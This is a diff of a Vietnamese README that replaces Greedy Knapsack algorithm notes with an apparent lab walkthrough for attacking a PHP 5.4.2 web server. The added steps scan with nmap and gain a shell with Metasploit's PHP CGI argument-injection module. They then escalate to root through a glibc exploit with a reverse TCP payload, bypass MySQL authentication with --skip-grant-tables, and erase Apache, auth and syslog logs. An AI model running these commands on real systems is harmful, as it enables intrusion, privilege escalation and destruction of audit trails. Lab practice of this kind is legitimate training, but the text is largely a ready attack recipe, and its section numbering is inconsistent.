@@ -24,10 +24,6 @@ Dự án này mô phỏng việc khai thác lỗ hổng trong PHP 5.4.2 để th
 
 - [4.6. Xóa dấu vết ](#4.3)
 
-[5. Truy cập Cơ sở dữ liệu](#5)
-
-[6. Xóa dấu vết](#6)
-
 
 
 
@@ -61,58 +57,147 @@ Dự án này mô phỏng việc khai thác lỗ hổng trong PHP 5.4.2 để th
 
 ---
 
-<a name = '3.1'></a>
-## 3.1.	Ưu điểm
-
-- Đơn giản và dễ triển khai: Thuật toán Greedy có logic đơn giản và dễ dàng triển khai.
-- Hiệu quả về thời gian: Thuật toán Greedy thường có độ phức tạp thời gian thấp, giúp giải quyết bài toán nhanh chóng.
-- Hiệu quả cho bài toán Fractional Knapsack: Thuật toán Greedy cho kết quả tối ưu với bài toán Fractional Knapsack.
-<a name = '3.2'></a>
-## 3.2.	Nhược điểm
-
-- Không đảm bảo tối ưu cho mọi trường hợp: Thuật toán Greedy không đảm bảo tìm ra lời giải tối ưu cho tất cả các bài toán, đặc biệt là 0/1 Knapsack.
-- Không phù hợp cho các bài toán phức tạp: Với các bài toán có nhiều ràng buộc và yếu tố phức tạp, thuật toán Greedy có thể không cho ra kết quả chính xác.
-- Cần sắp xếp dữ liệu đầu vào: Thuật toán yêu cầu sắp xếp các mục theo tỷ lệ giá trị/trọng lượng, điều này có thể tốn thời gian nếu dữ liệu đầu vào lớn.
 <a name = '4'></a>
-# 4.	Cài đặt và sử dụng
+# 4.	Chi tiết các bước trong Lab
 
 <a name = '4.1'></a>
-## 4.1.	0/1 Knapsack Problem
+## Bước 1: Quét máy chủ web
+Sử dụng lệnh **Nmap** để xác định phiên bản PHP và phát hiện lỗ hổng.
+
+```bash
+nmap -p 80 --script=http-php-version 192.168.40.128
 ```
-var items = new List<Item>
-{
-    new Item { Value = 60, Weight = 10 },
-    new Item { Value = 100, Weight = 20 },
-    new Item { Value = 120, Weight = 30 }
-};
-int capacity = 50;
-double maxValue = GreedyKnapsack01.Calculate(capacity, items);
-Console.WriteLine("Gia tri lon nhat co the dat duoc: " + maxValue);
-```
+
+Kết quả: Quét phát hiện máy chủ web đang chạy **PHP 5.4.2**.
+
+---
+
 <a name = '4.2'></a>
-## 4.2.	Fractional Knapsack Problem
-```
-var items = new List<Item>
-{
-    new Item { Value = 60, Weight = 10 },
-    new Item { Value = 100, Weight = 20 },
-    new Item { Value = 120, Weight = 30 }
-};
-int capacity = 50;
-double maxValue = GreedyKnapsackFractional.Calculate(capacity, items);
-Console.WriteLine("Gia tri lon nhat co the dat duoc: " + maxValue);
-```
+## 4.2.	Khai thác lỗ hổng PHP CGI
+1. Khởi động Metasploit và tìm kiếm lỗ hổng:
+   ```bash
+   msf6 > search php cgi
+   ```
+
+2. Chọn và cấu hình khai thác:
+   ```bash
+   use exploit/unix/webapp/php_cgi_arg_injection
+   ```
+
+3. Đặt IP của máy chủ web mục tiêu:
+   ```bash
+   set rhosts 192.168.40.128
+   ```
+
+4. Chạy khai thác để có quyền truy cập shell:
+   ```bash
+   run
+   ```
+
+Kết quả: Đã truy cập thành công với quyền **www-data**.
+
+---
+
 <a name = '4.3'></a>
-## 4.3.	Bounded Knapsack Problem
-```
-// Sử dụng
-var items = new List<Item>
-{
-    new Item { Value = 60, Weight = 10, Quantity = 2 },
-    new Item { Value = 100, Weight = 20, Quantity = 2 },
-    new Item { Value = 120, Weight = 30, Quantity = 2 }
-};
-int capacity = 50;
-double maxValue = GreedyKnapsackBounded.Calculate(capacity, items);
-Console.WriteLine("Gia tri lon nhat co the dat duoc: " + maxValue);
-```
+## 4.3.	Nâng cấp lên phiên Meterpreter
+1. Kiểm tra các phiên hoạt động:
+   ```bash
+   sessions
+   ```
+
+2. Nâng cấp lên phiên Meterpreter:
+   ```bash
+   session -u [session_id]
+   ```
+
+3. Tương tác với phiên Meterpreter:
+   ```bash
+   sessions -i [session_id]
+   ```
+
+Kết quả: Nâng cấp thành công lên Meterpreter.
+
+---
+
+<a name = '4.4'></a>
+## 4.3. Leo thang đặc quyền
+
+Sử dụng **Metasploit's Local Exploit Suggester** để tìm cách leo thang đặc quyền.
+
+1. Dùng module **local exploit suggester**:
+   ```bash
+   use post/multi/recon/local_exploit_suggester
+   ```
+
+2. Chạy module để tìm khai thác khả thi:
+   ```bash
+   run
+   ```
+
+3. Khai thác lỗ hổng **glibc_ld_audit_dso_load_priv_esc**:
+   ```bash
+   use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
+   ```
+
+4. Đặt các tùy chọn cần thiết:
+   ```bash
+   set session [session_id]
+   set LHOST [địa_chỉ_ip_của_bạn]
+   set PAYLOAD linux/x64/shell/reverse_tcp
+   ```
+
+5. Chạy khai thác:
+   ```bash
+   run
+   ```
+
+Kết quả: Đã leo thang thành công lên **root**.
+
+---
+
+<a name = '4.5'></a>
+## 4.3.	Truy cập cơ sở dữ liệu
+
+1. Dừng dịch vụ MySQL:
+   ```bash
+   /etc/init.d/mysql stop
+   ```
+
+2. Khởi động MySQL mà không yêu cầu mật khẩu:
+   ```bash
+   mysqld_safe --skip-grant-tables &
+   ```
+
+3. Truy cập cơ sở dữ liệu qua **phpMyAdmin** hoặc dòng lệnh.
+
+4. Thay đổi mật khẩu hoặc thêm người dùng mới trong cơ sở dữ liệu.
+
+---
+<a name = '4.6'></a>
+## 4.3.	Xóa dấu vết
+
+Để xóa dấu vết sau khi khai thác, cần xóa log hệ thống và log web server.
+
+1. Xóa log Apache hoặc Nginx:
+   ```bash
+   echo > /var/log/apache2/access.log
+   echo > /var/log/apache2/error.log
+   ```
+
+2. Xóa log hệ thống:
+   ```bash
+   echo > /var/log/auth.log
+   echo > /var/log/syslog
+   ```
+
+3. Xóa log của Metasploit:
+   ```bash
+   rm -rf ~/.msf4/logs/
+   ```
+
+Kết quả: Các file log đã bị xóa.
+
+---
+
+
+
